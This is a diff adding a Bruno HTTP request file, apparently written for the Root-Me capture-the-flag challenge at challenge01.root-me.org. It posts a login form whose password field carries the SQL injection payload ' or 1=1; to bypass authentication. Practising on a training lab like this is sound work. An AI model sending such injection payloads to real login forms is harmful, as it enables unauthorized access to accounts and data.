@@ -1,0 +1,31 @@
+meta {
+  name: or 1=1
+  type: http
+  seq: 1
+}
+
+post {
+  url: {{url}}{{auth_path}}
+  body: multipartForm
+  auth: none
+}
+
+headers {
+  Host: challenge01.root-me.org
+  $'Content-Length: 24'
+  $'Cache-Control: max-age=0'
+  $'Accept-Language: fr-FR,fr;q=0.9'
+  $'Origin: http://challenge01.root-me.org'
+  $'Content-Type: application/x-www-form-urlencoded'
+  $'Upgrade-Insecure-Requests: 1'
+  $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36'
+  $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
+  $'Referer: http://challenge01.root-me.org/web-serveur/ch9/'
+  $'Accept-Encoding: gzip, deflate, br'
+  $'Connection: keep-alive'
+}
+
+body:multipart-form {
+  login: test
+  password: ' or 1=1;
+}
